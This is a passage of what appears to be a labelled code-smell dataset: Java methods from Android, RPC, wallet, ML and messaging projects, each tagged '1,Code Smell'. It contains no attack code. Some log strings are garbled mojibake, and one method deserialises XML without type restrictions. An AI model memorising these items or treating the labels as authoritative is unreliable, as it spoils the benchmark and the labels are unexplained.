      if (!mWindowAlignment.mainAxis().isMinUnknown()) {
        int minScroll=mWindowAlignment.mainAxis().getMinScroll();
        if (da < minScroll) {
          da=minScroll;
        }
      }
    }
  }
  if (da == 0) {
    if (TRACE)     TraceCompat.endSection();
    return 0;
  }
  offsetChildrenPrimary(-da);
  if ((mFlag & PF_STAGE_MASK) == PF_STAGE_LAYOUT) {
    updateScrollLimits();
    if (TRACE)     TraceCompat.endSection();
    return da;
  }
  int childCount=getChildCount();
  boolean updated;
  if ((mFlag & PF_REVERSE_FLOW_PRIMARY) != 0 ? da > 0 : da < 0) {
    prependVisibleItems();
  }
 else {
    appendVisibleItems();
  }
  updated=getChildCount() > childCount;
  childCount=getChildCount();
  if (TRACE)   TraceCompat.beginSection(""remove"");
  if ((mFlag & PF_REVERSE_FLOW_PRIMARY) != 0 ? da > 0 : da < 0) {
    removeInvisibleViewsAtEnd();
  }
 else {
    removeInvisibleViewsAtFront();
  }
  if (TRACE)   TraceCompat.endSection();
  updated|=getChildCount() < childCount;
  if (updated) {
    updateRowSecondarySizeRefresh();
  }
  mBaseGridView.invalidate();
  updateScrollLimits();
  if (TRACE)   TraceCompat.endSection();
  return da;
}",1,Code Smell
"public static void startDownload(final MainActivity activity,final GalleryInfo galleryInfo,boolean forceDefault){
  startDownload(activity,Collections.singletonList(galleryInfo),forceDefault);
}
public static void startDownload(final MainActivity activity,final List<GalleryInfo> galleryInfos,boolean forceDefault){
  final DownloadManager dm=EhApplication.getDownloadManager(activity);
  LongList toStart=new LongList();
  List<GalleryInfo> toAdd=new ArrayList<>();
  for (  GalleryInfo gi : galleryInfos) {
    if (dm.containDownloadInfo(gi.gid)) {
      toStart.add(gi.gid);
    }
 else {
      toAdd.add(gi);
    }
  }
  if (!toStart.isEmpty()) {
    Intent intent=new Intent(activity,DownloadService.class);
    intent.setAction(DownloadService.ACTION_START_RANGE);
    intent.putExtra(DownloadService.KEY_GID_LIST,toStart);
    activity.startService(intent);
  }
  if (toAdd.isEmpty()) {
    activity.showTip(R.string.added_to_download_list,BaseScene.LENGTH_SHORT);
    return;
  }
  boolean justStart=forceDefault;
  String label=null;
  if (!justStart && Settings.getHasDefaultDownloadLabel()) {
    label=Settings.getDefaultDownloadLabel();
    justStart=label == null || dm.containLabel(label);
  }
  if (!justStart && 0 == dm.getLabelList().size()) {
    justStart=true;
    label=null;
  }
  if (justStart) {
    for (    GalleryInfo gi : toAdd) {
      Intent intent=new Intent(activity,DownloadService.class);
      intent.setAction(DownloadService.ACTION_START);
      intent.putExtra(DownloadService.KEY_LABEL,label);
      intent.putExtra(DownloadService.KEY_GALLERY_INFO,gi);
      activity.startService(intent);
    }
    activity.showTip(R.string.added_to_download_list,BaseScene.LENGTH_SHORT);
  }
 else {
    List<DownloadLabel> list=dm.getLabelList();
    final String[] items=new String[list.size() + 1];
    items[0]=activity.getString(R.string.default_download_label_name);
    for (int i=0, n=list.size(); i < n; i++) {
      items[i + 1]=list.get(i).getLabel();
    }
    new ListCheckBoxDialogBuilder(activity,items,(builder,dialog,position) -> {
      String label1;
      if (position == 0) {
        label1=null;
      }
 else {
        label1=items[position];
        if (!dm.containLabel(label1)) {
          label1=null;
        }
      }
      for (      GalleryInfo gi : toAdd) {
        Intent intent=new Intent(activity,DownloadService.class);
        intent.setAction(DownloadService.ACTION_START);
        intent.putExtra(DownloadService.KEY_LABEL,label1);
        intent.putExtra(DownloadService.KEY_GALLERY_INFO,gi);
        activity.startService(intent);
      }
      if (builder.isChecked()) {
        Settings.putHasDefaultDownloadLabel(true);
        Settings.putDefaultDownloadLabel(label1);
      }
 else {
        Settings.putHasDefaultDownloadLabel(false);
      }
      activity.showTip(R.string.added_to_download_list,BaseScene.LENGTH_SHORT);
    }
,activity.getString(R.string.remember_download_label),false).setTitle(R.string.download).show();
  }
}",1,Code Smell
"/** 
 * Invoke the object with the request from the input stream.
 * @param in the Burlap input stream
 * @param out the Burlap output stream
 */
public void invoke(BurlapInput in,BurlapOutput out) throws Exception {
  invoke(_service,in,out);
}
/** 
 * Invoke the object with the request from the input stream.
 * @param in the Burlap input stream
 * @param out the Burlap output stream
 */
public void invoke(Object service,BurlapInput in,BurlapOutput out) throws Exception {
  in.readCall();
  ServiceContext context=ServiceContext.getContext();
  String header;
  while ((header=in.readHeader()) != null) {
    Object value=in.readObject();
    context.addHeader(header,value);
  }
  String methodName=in.readMethod();
  Method method=getMethod(methodName);
  if (log.isLoggable(Level.FINE))   log.fine(this + "" invoking "" + methodName+ "" (""+ method+ "")"");
  if (method != null) {
  }
 else   if (""_burlap_getAttribute"".equals(in.getMethod())) {
    String attrName=in.readString();
    in.completeCall();
    String value=null;
    if (""java.api.class"".equals(attrName))     value=getAPIClassName();
 else     if (""java.home.class"".equals(attrName))     value=getHomeClassName();
 else     if (""java.object.class"".equals(attrName))     value=getObjectClassName();
    out.startReply();
    out.writeObject(value);
    out.completeReply();
    return;
  }
 else   if (method == null) {
    out.startReply();
    out.writeFault(""NoSuchMethodException"",""The service has no method named: "" + in.getMethod(),null);
    out.completeReply();
    return;
  }
  Class[] args=method.getParameterTypes();
  Object[] values=new Object[args.length];
  for (int i=0; i < args.length; i++)   values[i]=in.readObject(args[i]);
  in.completeCall();
  Object result=null;
  try {
    result=method.invoke(service,values);
  }
 catch (  Throwable e) {
    log.log(Level.FINE,service + ""."" + method.getName()+ ""() failed with exception:\n""+ e.toString(),e);
    if (e instanceof InvocationTargetException && e.getCause() instanceof Exception)     e=((InvocationTargetException)e).getTargetException();
    out.startReply();
    out.writeFault(""ServiceException"",e.getMessage(),e);
    out.completeReply();
    return;
  }
  out.startReply();
  out.writeObject(result);
  out.completeReply();
}",1,Code Smell
"@Override public void run(){
  SparrowTerminal.get().getGui().addWindow(loadingDialog);
  try {
    if (!storage.isEncrypted()) {
      Platform.runLater(() -> {
        Storage.LoadWalletService loadWalletService=new Storage.LoadWalletService(storage);
        loadWalletService.setExecutor(Storage.LoadWalletService.getSingleThreadedExecutor());
        loadWalletService.setOnSucceeded(workerStateEvent -> {
          WalletAndKey walletAndKey=loadWalletService.getValue();
          openWallet(storage,walletAndKey);
        }
);
        loadWalletService.setOnFailed(workerStateEvent -> {
          SparrowTerminal.get().getGuiThread().invokeLater(() -> SparrowTerminal.get().getGui().removeWindow(loadingDialog));
          Throwable exception=workerStateEvent.getSource().getException();
          if (exception instanceof StorageException) {
            showErrorDialog(""Error Opening Wallet"",exception.getMessage());
          }
        }
);
        loadWalletService.start();
      }
);
    }
 else {
      TextInputDialogBuilder builder=new TextInputDialogBuilder().setTitle(""Wallet Password"");
      builder.setDescription(""Enter the password for\n"" + storage.getWalletName(null));
      builder.setPasswordInput(true);
      String password=builder.build().showDialog(SparrowTerminal.get().getGui());
      if (password == null) {
        SparrowTerminal.get().getGui().removeWindow(loadingDialog);
        return;
      }
      Platform.runLater(() -> {
        Storage.LoadWalletService loadWalletService=new Storage.LoadWalletService(storage,new SecureString(password));
        loadWalletService.setOnSucceeded(workerStateEvent -> {
          EventManager.get().post(new StorageEvent(storage.getWalletId(null),TimedEvent.Action.END,""Done""));
          WalletAndKey walletAndKey=loadWalletService.getValue();
          openWallet(storage,walletAndKey);
        }
);
        loadWalletService.setOnFailed(workerStateEvent -> {
          EventManager.get().post(new StorageEvent(storage.getWalletId(null),TimedEvent.Action.END,""Failed""));
          SparrowTerminal.get().getGuiThread().invokeLater(() -> SparrowTerminal.get().getGui().removeWindow(loadingDialog));
          Throwable exception=loadWalletService.getException();
          if (exception instanceof InvalidPasswordException) {
            Optional<ButtonType> optResponse=showErrorDialog(""Invalid Password"",""The wallet password was invalid. Try again?"",ButtonType.CANCEL,ButtonType.OK);
            if (optResponse.isPresent() && optResponse.get().equals(ButtonType.OK)) {
              run();
            }
          }
 else {
            if (exception instanceof StorageException) {
              showErrorDialog(""Error Opening Wallet"",exception.getMessage());
            }
          }
        }
);
        EventManager.get().post(new StorageEvent(storage.getWalletId(null),TimedEvent.Action.START,""Decrypting wallet...""));
        loadWalletService.start();
      }
);
    }
  }
 catch (  Exception e) {
    if (e instanceof IOException && e.getMessage().startsWith(""The process cannot access the file because another process has locked"")) {
      showErrorDialog(""Error Opening Wallet"",""The wallet file is locked. Is another instance of "" + SparrowWallet.APP_NAME + "" already running?"");
    }
 else {
      log.error(""Error opening wallet"",e);
      showErrorDialog(""Error Opening Wallet"",e.getMessage() == null ? ""Unsupported file format"" : e.getMessage());
    }
  }
}
",1,Code Smell
"/** 
 * Runs Viterbi on a linear chain CRF. Uses the linear predictions for each token and the label transition probabilities.
 * @param scores Tuple containing the label-label transition matrix, and the per token label scores.
 * @return Tuple containing the score of the maximum path and the maximum predicted label per token.
 */
public static ChainViterbiResults viterbi(ChainCliqueValues scores){
  DenseMatrix markovScores=scores.transitionValues;
  DenseVector[] localScores=scores.localValues;
  int numLabels=markovScores.getDimension1Size();
  DenseVector[] costs=new DenseVector[scores.localValues.length];
  int[][] backPointers=new int[scores.localValues.length][];
  for (int i=0; i < scores.localValues.length; i++) {
    costs[i]=new DenseVector(numLabels,Double.NEGATIVE_INFINITY);
    backPointers[i]=new int[numLabels];
    Arrays.fill(backPointers[i],-1);
  }
  costs[0].setElements(localScores[0]);
  for (int i=1; i < scores.localValues.length; i++) {
    DenseVector curLocalScores=localScores[i];
    DenseVector curCost=costs[i];
    int[] curBackPointers=backPointers[i];
    DenseVector prevCost=costs[i - 1];
    for (int vi=0; vi < numLabels; vi++) {
      double maxScore=Double.NEGATIVE_INFINITY;
      int maxIndex=-1;
      double curLocalScore=curLocalScores.get(vi);
      for (int vj=0; vj < numLabels; vj++) {
        double curScore=markovScores.get(vj,vi) + prevCost.get(vj) + curLocalScore;
        if (curScore > maxScore) {
          maxScore=curScore;
          maxIndex=vj;
        }
      }
      curCost.set(vi,maxScore);
      if (maxIndex < 0) {
        maxIndex=0;
      }
      curBackPointers[vi]=maxIndex;
    }
  }
  int[] mapValues=new int[scores.localValues.length];
  mapValues[mapValues.length - 1]=costs[costs.length - 1].indexOfMax();
  for (int j=mapValues.length - 2; j >= 0; j--) {
    mapValues[j]=backPointers[j + 1][mapValues[j + 1]];
  }
  return new ChainViterbiResults(costs[costs.length - 1].maxValue(),mapValues,scores);
}",1,Code Smell
"protected Pair<LIMEExplanation,List<Example<Regressor>>> explainWithSamples(Map<String,String> input){
  Optional<Example<Label>> optExample=generator.generateExample(input,false);
  if (optExample.isPresent()) {
    Example<Label> example=optExample.get();
    if ((textDomain.size() == 0) && (binarisedCDFs.size() == 0)) {
      return explainWithSamples(example);
    }
 else {
      Prediction<Label> prediction=innerModel.predict(example);
      ArrayExample<Regressor> labelledExample=new ArrayExample<>(transformOutput(prediction));
      for (      Feature f : example) {
        if (tabularDomain.getID(f.getName()) != -1) {
          labelledExample.add(f);
        }
      }
      SparseVector tabularVector=SparseVector.createSparseVector(labelledExample,tabularDomain,false);
      Map<String,String> exampleTextValues=new HashMap<>();
      Map<String,List<Token>> exampleTextTokens=new HashMap<>();
      for (      Map.Entry<String,FieldProcessor> e : textFields.entrySet()) {
        String value=input.get(e.getKey());
        if (value != null) {
          List<Token> tokens=tokenizerThreadLocal.get().tokenize(value);
          for (int i=0; i < tokens.size(); i++) {
            labelledExample.add(nameFeature(e.getKey(),tokens.get(i).text,i),1.0);
          }
          exampleTextValues.put(e.getKey(),value);
          exampleTextTokens.put(e.getKey(),tokens);
        }
      }
      List<Example<Regressor>> sample=sampleData(tabularVector,exampleTextValues,exampleTextTokens);
      SparseModel<Regressor> model=trainExplainer(labelledExample,sample);
      List<Prediction<Regressor>> predictions=new ArrayList<>(model.predict(sample));
      predictions.add(model.predict(labelledExample));
      RegressionEvaluation evaluation=evaluator.evaluate(model,predictions,new SimpleDataSourceProvenance(""LIMEColumnar sampled data"",regressionFactory));
      return new Pair<>(new LIMEExplanation(model,prediction,evaluation),sample);
    }
  }
 else {
    throw new IllegalArgumentException(""Label not found in input "" + input.toString());
  }
}",1,Code Smell
"private Expression resolveCallExpression(Type targetType,String name,List<? extends ExpressionElement> inner,boolean allowNonImplicit,boolean allowImplicit){
  this.log(""[DEBUG] resolving function %s with args %s to type %s"",name,inner,targetType);
  Expression result=null;
  if (allowNonImplicit) {
    result=this.resolveCallExpressionInternal(targetType,name,inner,false);
  }
  if (result != null) {
    this.log(""[DEBUG] resolved function %s with args %s to type %s directly"",name,inner,targetType);
    return result;
  }
 else   if (!allowImplicit) {
    this.log(""[DEBUG] Failed to resolve function %s with args %s to type %s directly"",name,inner,targetType);
    return null;
  }
  List<? extends TypedFunction> casts=this.functionResolver.resolve(""<cast>"",targetType);
  for (  TypedFunction f : casts) {
    Expression u=this.resolveCallExpression(f.getParameters()[0].type(),name,inner,true,true);
    if (u == null)     continue;
    if (result != null)     throw new RuntimeException(""Ambiguity"");
    result=new CallExpression(f,new Expression[]{u});
  }
  if (result != null) {
    this.log(""[DEBUG] resolved function %s with args %s to type %s using only final cast"",name,inner,targetType);
    return result;
  }
  result=this.resolveCallExpressionInternal(targetType,name,inner,true);
  if (result != null) {
    this.log(""[DEBUG] resolved function %s with args %s to type %s using implicit inner casts"",name,inner,targetType);
  }
 else {
    this.log(""[DEBUG] failed to resolve function %s with args %s to type %s"",name,inner,targetType);
  }
  return result;
}",1,Code Smell
"private void updateReactionsCell(boolean animated){
  boolean isChannelAndNotMegaGroup=ChatObject.isChannelAndNotMegaGroup(currentChat);
  String finalString;
  if (availableReactions == null || availableReactions instanceof TLRPC.TL_chatReactionsNone) {
    finalString=getString(""ReactionsOff"",R.string.ReactionsOff);
  }
 else   if (availableReactions instanceof TLRPC.TL_chatReactionsSome) {
    TLRPC.TL_chatReactionsSome someReactions=(TLRPC.TL_chatReactionsSome)availableReactions;
    int count=0;
    for (int i=0; i < someReactions.reactions.size(); i++) {
      TLRPC.Reaction someReaction=someReactions.reactions.get(i);
      if (someReaction instanceof TLRPC.TL_reactionEmoji) {
        TLRPC.TL_reactionEmoji tl_reactionEmoji=(TLRPC.TL_reactionEmoji)someReaction;
        TLRPC.TL_availableReaction reaction=getMediaDataController().getReactionsMap().get(tl_reactionEmoji.emoticon);
        if (reaction != null && !reaction.inactive) {
          count++;
        }
      }
 else       if (someReaction instanceof TLRPC.TL_reactionCustomEmoji) {
        count++;
      }
    }
    if (isChannelAndNotMegaGroup) {
      finalString=count == 0 ? getString(""ReactionsOff"",R.string.ReactionsOff) : String.valueOf(count);
    }
 else {
      int reacts=Math.min(getMediaDataController().getEnabledReactionsList().size(),count);
      finalString=reacts == 0 ? getString(""ReactionsOff"",R.string.ReactionsOff) : LocaleController.formatString(""ReactionsCount"",R.string.ReactionsCount,reacts,getMediaDataController().getEnabledReactionsList().size());
    }
  }
 else {
    finalString=getString(""ReactionsAll"",R.string.ReactionsAll);
  }
  reactionsCell.setTextAndValueAndIcon(getString(""Reactions"",R.string.Reactions),finalString,animated,R.drawable.msg_reactions2,true);
}",1,Code Smell
"@Override public ResourceBundle newBundle(String baseName,Locale locale,String format,ClassLoader loader,boolean reload) throws IllegalAccessException, InstantiationException, IOException {
  String bundleName=toBundleName(baseName,locale);
  ResourceBundle bundle=null;
  if (JAVA_CLASS.equals(format)) {
    try {
      @SuppressWarnings(""unchecked"") Class<? extends ResourceBundle> bundleClass=(Class<? extends ResourceBundle>)loader.loadClass(bundleName);
      if (ResourceBundle.class.isAssignableFrom(bundleClass)) {
        bundle=bundleClass.newInstance();
      }
 else {
        throw new ClassCastException(bundleClass.getName() + "" cannot be cast to ResourceBundle"");
      }
    }
 catch (    ClassNotFoundException ignored) {
    }
  }
 else   if (JAVA_PROPERTIES.equals(format)) {
    final String resourceName=toResourceName0(bundleName,""properties"");
    if (resourceName == null) {
      return null;
    }
    final ClassLoader classLoader=loader;
    final boolean reloadFlag=reload;
    InputStream stream;
    try {
      stream=AccessController.doPrivileged((PrivilegedExceptionAction<InputStream>)() -> {
        InputStream is=null;
        if (reloadFlag) {
          URL url=classLoader.getResource(resourceName);
          if (url != null) {
            URLConnection connection=url.openConnection();
            if (connection != null) {
              connection.setUseCaches(false);
              is=connection.getInputStream();
            }
          }
        }
 else {
          is=classLoader.getResourceAsStream(resourceName);
        }
        return is;
      }
);
    }
 catch (    PrivilegedActionException e) {
      throw (IOException)e.getException();
    }
    if (stream != null) {
      try {
        bundle=new PropertyResourceBundle(new InputStreamReader(stream,StandardCharsets.UTF_8));
      }
  finally {
        stream.close();
      }
    }
  }
 else {
    throw new IllegalArgumentException(""unknown format: "" + format);
  }
  return bundle;
}",1,Code Smell
"public void onLoad(){
  if (this.loaded)   return;
  for (  GroupInfo group : groups.values()) {
    if (group.getPropList() == null) {
      continue;
    }
    for (    PropInfo prop : group.getPropList()) {
      if (prop.getAnchorID() > 0) {
        this.cachedTeleports.put(prop.getMappingInfoID(),prop);
        this.unlockedCheckpoints.add(prop);
        prop.setState(PropState.CheckPointEnable);
      }
 else       if (prop.getInitLevelGraph() != null) {
        String json=prop.getInitLevelGraph();
        if (json.contains(""Maze_GroupProp_OpenTreasure_WhenMonsterDie"")) {
          prop.setTrigger(new TriggerOpenTreasureWhenMonsterDie(group.getId()));
        }
 else         if (json.contains(""Common_Console"")) {
          prop.setCommonConsole(true);
        }
        prop.setValueSource(null);
        prop.setInitLevelGraph(null);
      }
    }
  }
  this.loaded=true;
}",1,Code Smell
"/** 
 * Add or Modify consumer group offset.
 * @param req      request
 * @param sBuffer  process result
 */
public void adminSetGroupOffSet(HttpServletRequest req,StringBuilder sBuffer){
  ProcessResult result=new ProcessResult();
  if (!WebParameterUtils.getStringParamValue(req,WebFieldDef.COMPSGROUPNAME,true,null,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return;
  }
  final Set<String> groupNameSet=(Set<String>)result.getRetData();
  if (!WebParameterUtils.getBooleanParamValue(req,WebFieldDef.MANUALSET,true,false,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return;
  }
  boolean manualSet=(Boolean)result.getRetData();
  if (!WebParameterUtils.getStringParamValue(req,WebFieldDef.MODIFYUSER,true,null,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return;
  }
  List<Tuple3<String,Integer,Long>> resetOffsets;
  final String modifier=(String)result.getRetData();
  if (manualSet) {
    if (!WebParameterUtils.getJsonDictParamValue(req,WebFieldDef.OFFSETJSON,true,null,result)) {
      WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
      return;
    }
    Map<String,Long> manOffsets=(Map<String,Long>)result.getRetData();
    if (!validManOffsetResetInfo(WebFieldDef.OFFSETJSON,manOffsets,result)) {
      WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
      return;
    }
    resetOffsets=(List<Tuple3<String,Integer,Long>>)result.getRetData();
  }
 else {
    if (!WebParameterUtils.getStringParamValue(req,WebFieldDef.COMPSTOPICNAME,true,null,sBuffer,result)) {
      WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
      return;
    }
    Set<String> topicSet=(Set<String>)result.getRetData();
    resetOffsets=buildOffsetResetInfo(topicSet);
  }
  broker.getOffsetManager().modifyGroupOffset(groupNameSet,resetOffsets,modifier);
  sBuffer.append(""{\""result\"":true,\""errCode\"":0,\""errMsg\"":\""OK\""}"");
}",1,Code Smell
"public static List<VirtualFile> getMatchFileList(VirtualFile[] files,Predicate<VirtualFile> predicate,boolean breakWhenFoundOne){
  List<VirtualFile> result=new LinkedList<>();
  if (files == null) {
    return result;
  }
  for (  VirtualFile file : files) {
    if (file.isDirectory()) {
      if (""build"".equals(file.getName())) {
        continue;
      }
      result.addAll(getMatchFileList(file.getChildren(),predicate,breakWhenFoundOne));
      if (breakWhenFoundOne && !result.isEmpty()) {
        break;
      }
    }
 else {
      if (predicate.test(file)) {
        result.add(file);
        if (breakWhenFoundOne) {
          break;
        }
      }
    }
  }
  return result;
}
",1,Code Smell
"private static void receiveToolTaskReward(){
  try {
    String s=AntFarmRpcCall.listToolTaskDetails();
    JSONObject jo=new JSONObject(s);
    String memo=jo.getString(""memo"");
    if (""SUCCESS"".equals(memo)) {
      JSONArray jaList=jo.getJSONArray(""list"");
      for (int i=0; i < jaList.length(); i++) {
        JSONObject joItem=jaList.getJSONObject(i);
        if (joItem.has(""taskStatus"") && TaskStatus.FINISHED.name().equals(joItem.getString(""taskStatus""))) {
          JSONObject bizInfo=new JSONObject(joItem.getString(""bizInfo""));
          String awardType=bizInfo.getString(""awardType"");
          ToolType toolType=ToolType.valueOf(awardType);
          boolean isFull=false;
          for (          FarmTool farmTool : farmTools) {
            if (farmTool.toolType == toolType) {
              if (farmTool.toolCount == farmTool.toolHoldLimit) {
                isFull=true;
              }
              break;
            }
          }
          if (isFull) {
            Log.recordLog(""棰嗗彇閬撳叿馃帠锔廩"" + toolType.nickName() + ""]#宸叉弧锛屾殏涓嶉鍙�"");
            continue;
          }
          int awardCount=bizInfo.getInt(""awardCount"");
          String taskType=joItem.getString(""taskType"");
          String taskTitle=bizInfo.getString(""taskTitle"");
          s=AntFarmRpcCall.receiveToolTaskReward(awardType,awardCount,taskType);
          jo=new JSONObject(s);
          memo=jo.getString(""memo"");
          if (""SUCCESS"".equals(memo)) {
            Log.farm(""棰嗗彇閬撳叿馃帠锔廩"" + taskTitle + ""-""+ toolType.nickName()+ ""]#""+ awardCount+ ""寮�"");
          }
 else {
            memo=memo.replace(""閬撳叿"",toolType.nickName());
            Log.recordLog(memo,s);
          }
        }
      }
    }
 else {
      Log.recordLog(memo,s);
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""receiveToolTaskReward err:"");
    Log.printStackTrace(TAG,t);
  }
}",1,Code Smell
"public void readAllDialogs(int folderId){
  storageQueue.postRunnable(() -> {
    SQLiteCursor cursor=null;
    try {
      ArrayList<Long> usersToLoad=new ArrayList<>();
      ArrayList<Long> chatsToLoad=new ArrayList<>();
      ArrayList<Integer> encryptedChatIds=new ArrayList<>();
      LongSparseArray<ReadDialog> dialogs=new LongSparseArray<>();
      if (folderId >= 0) {
        cursor=database.queryFinalized(String.format(Locale.US,""SELECT did, last_mid, unread_count, date FROM dialogs WHERE unread_count > 0 AND folder_id = %1$d"",folderId));
      }
 else {
        cursor=database.queryFinalized(""SELECT did, last_mid, unread_count, date FROM dialogs WHERE unread_count > 0"");
      }
      while (cursor.next()) {
        long did=cursor.longValue(0);
        if (DialogObject.isFolderDialogId(did)) {
          continue;
        }
        ReadDialog dialog=new ReadDialog();
        dialog.lastMid=cursor.intValue(1);
        dialog.unreadCount=cursor.intValue(2);
        dialog.date=cursor.intValue(3);
        dialogs.put(did,dialog);
        if (!DialogObject.isEncryptedDialog(did)) {
          if (DialogObject.isChatDialog(did)) {
            if (!chatsToLoad.contains(-did)) {
              chatsToLoad.add(-did);
            }
          }
 else {
            if (!usersToLoad.contains(did)) {
              usersToLoad.add(did);
            }
          }
        }
 else {
          int encryptedChatId=DialogObject.getEncryptedChatId(did);
          if (!encryptedChatIds.contains(encryptedChatId)) {
            encryptedChatIds.add(encryptedChatId);
          }
        }
      }
      cursor.dispose();
      cursor=null;
      ArrayList<TLRPC.User> users=new ArrayList<>();
      ArrayList<TLRPC.Chat> chats=new ArrayList<>();
      ArrayList<TLRPC.EncryptedChat> encryptedChats=new ArrayList<>();
      if (!encryptedChatIds.isEmpty()) {
        getEncryptedChatsInternal(TextUtils.join("","",encryptedChatIds),encryptedChats,usersToLoad);
      }
      if (!usersToLoad.isEmpty()) {
        getUsersInternal(TextUtils.join("","",usersToLoad),users);
      }
      if (!chatsToLoad.isEmpty()) {
        getChatsInternal(TextUtils.join("","",chatsToLoad),chats);
      }
      AndroidUtilities.runOnUIThread(() -> {
        getMessagesController().putUsers(users,true);
        getMessagesController().putChats(chats,true);
        getMessagesController().putEncryptedChats(encryptedChats,true);
        for (int a=0; a < dialogs.size(); a++) {
          long did=dialogs.keyAt(a);
          ReadDialog dialog=dialogs.valueAt(a);
          getMessagesController().markDialogAsRead(did,dialog.lastMid,dialog.lastMid,dialog.date,false,0,dialog.unreadCount,true,0);
        }
      }
);
    }
 catch (    Exception e) {
      checkSQLException(e);
    }
 finally {
      if (cursor != null) {
        cursor.dispose();
      }
    }
  }
);
}",1,Code Smell
"private void parseEvn(String envStr){
  String[] envStringArr=envStr.split(StringUtils.LF);
  Map<String,Map<String,String>> envVarsMap=new HashMap<>();
  for (  String env : envStringArr) {
    if (StringUtils.contains(env,""="")) {
      String[] envItem=env.split(""="");
      if (envItem.length == 0) {
        continue;
      }
      String jmeterVarKey=envItem[0];
      if (checkValidity(jmeterVarKey)) {
        String[] envAndKeyArr=jmeterVarKey.substring(ENV_STR.length()).split(""\\."");
        if (envAndKeyArr.length == 0) {
          continue;
        }
        String envId=envAndKeyArr[0];
        String key=StringUtils.join(ArrayUtils.remove(envAndKeyArr,0),""."");
        String value=StringUtils.substring(env,jmeterVarKey.length() + 1);
        if (StringUtils.isNoneEmpty(envId,key)) {
          envVarsMap.computeIfAbsent(envId,k -> new HashMap<>()).put(key,value);
        }
      }
    }
  }
  if (!envVarsMap.isEmpty()) {
    envVarsMap.forEach(this::addParam);
  }
}",1,Code Smell
"public void markMentionMessageAsRead(long dialogId,int messageId,long did){
  storageQueue.postRunnable(() -> {
    SQLiteCursor cursor=null;
    try {
      database.executeFast(String.format(Locale.US,""UPDATE messages_v2 SET read_state = read_state | 2 WHERE mid = %d AND uid = %d"",messageId,dialogId)).stepThis().dispose();
      cursor=database.queryFinalized(""SELECT unread_count_i FROM dialogs WHERE did = "" + did);
      int old_mentions_count=0;
      if (cursor.next()) {
        old_mentions_count=Math.max(0,cursor.intValue(0) - 1);
      }
      cursor.dispose();
      cursor=null;
      database.executeFast(String.format(Locale.US,""UPDATE dialogs SET unread_count_i = %d WHERE did = %d"",old_mentions_count,did)).stepThis().dispose();
      LongSparseIntArray sparseArray=new LongSparseIntArray(1);
      sparseArray.put(did,old_mentions_count);
      if (old_mentions_count == 0) {
        updateFiltersReadCounter(null,sparseArray,true);
      }
      getMessagesController().processDialogsUpdateRead(null,sparseArray);
      database.executeFast(String.format(Locale.US,""UPDATE messages_topics SET read_state = read_state | 2 WHERE mid = %d AND uid = %d"",messageId,dialogId)).stepThis().dispose();
      cursor=database.queryFinalized(String.format(Locale.US,""SELECT data FROM messages_topics WHERE mid = %d AND uid = %d"",messageId,dialogId));
      long topicId=0;
      while (cursor.next()) {
        NativeByteBuffer data=cursor.byteBufferValue(0);
        if (data != null) {
          TLRPC.Message message=TLRPC.Message.TLdeserialize(data,data.readInt32(false),false);
          data.reuse();
          topicId=MessageObject.getTopicId(currentAccount,message,isForum(dialogId));
        }
      }
      cursor.dispose();
      cursor=null;
      if (topicId != 0) {
        int topicMentionsCount=0;
        cursor=database.queryFinalized(String.format(Locale.US,""SELECT unread_mentions FROM topics WHERE did = %d AND topic_id = %d"",did,topicId));
        if (cursor.next()) {
          topicMentionsCount=Math.max(0,cursor.intValue(0) - 1);
        }
        cursor.dispose();
        cursor=null;
        database.executeFast(String.format(Locale.US,""UPDATE topics SET unread_mentions = %d WHERE did = %d AND topic_id = %d"",topicMentionsCount,dialogId,topicId)).stepThis().dispose();
        getMessagesController().getTopicsController().updateMentionsUnread(dialogId,topicId,topicMentionsCount);
      }
    }
 catch (    Exception e) {
      checkSQLException(e);
    }
 finally {
      if (cursor != null) {
        cursor.dispose();
      }
    }
  }
);
}",1,Code Smell
"/** 
 * @hide 
 */
public String toShortString(boolean secure,boolean comp,boolean extras,boolean clip){
  StringBuilder b=new StringBuilder(128);
  toShortString(b,secure,comp,extras,clip);
  return b.toString();
}
/** 
 * @hide 
 */
public void toShortString(StringBuilder b,boolean secure,boolean comp,boolean extras,boolean clip){
  boolean first=true;
  if (mAction != null) {
    b.append(""act="").append(mAction);
    first=false;
  }
  if (mCategories != null) {
    if (!first) {
      b.append(' ');
    }
    first=false;
    b.append(""cat=["");
    for (int i=0; i < mCategories.size(); i++) {
      if (i > 0)       b.append(',');
      b.append(mCategories.valueAt(i));
    }
    b.append(""]"");
  }
  if (mData != null) {
    if (!first) {
      b.append(' ');
    }
    first=false;
    b.append(""dat="");
    if (secure) {
      b.append(mData.toSafeString());
    }
 else {
      b.append(mData);
    }
  }
  if (mType != null) {
    if (!first) {
      b.append(' ');
    }
    first=false;
    b.append(""typ="").append(mType);
  }
  if (mFlags != 0) {
    if (!first) {
      b.append(' ');
    }
    first=false;
    b.append(""flg=0x"").append(Integer.toHexString(mFlags));
  }
  if (mPackage != null) {
    if (!first) {
      b.append(' ');
    }
    first=false;
    b.append(""pkg="").append(mPackage);
  }
  if (comp && mComponent != null) {
    if (!first) {
      b.append(' ');
    }
    first=false;
    b.append(""cmp="").append(mComponent.flattenToShortString());
  }
  if (mSourceBounds != null) {
    if (!first) {
      b.append(' ');
    }
    first=false;
    b.append(""bnds="").append(mSourceBounds.toShortString());
  }
  if (extras && mExtras != null) {
    if (!first) {
      b.append(' ');
    }
    first=false;
    b.append(""(has extras)"");
  }
  if (mSelector != null) {
    b.append("" sel="");
    mSelector.toShortString(b,secure,comp,extras,clip);
    b.append(""}"");
  }
}",1,Code Smell
"private AbsXml xml(MutableLiveData<AbsXml> result,String xml,String sourceKey){
  try {
    XStream xstream=new XStream(new DomDriver());
    xstream.autodetectAnnotations(true);
    xstream.processAnnotations(AbsXml.class);
    xstream.ignoreUnknownElements();
    if (xml.contains(""<year></year>"")) {
      xml=xml.replace(""<year></year>"",""<year>0</year>"");
    }
    if (xml.contains(""<state></state>"")) {
      xml=xml.replace(""<state></state>"",""<state>0</state>"");
    }
    AbsXml data=(AbsXml)xstream.fromXML(xml);
    absXml(data,sourceKey);
    if (searchResult == result) {
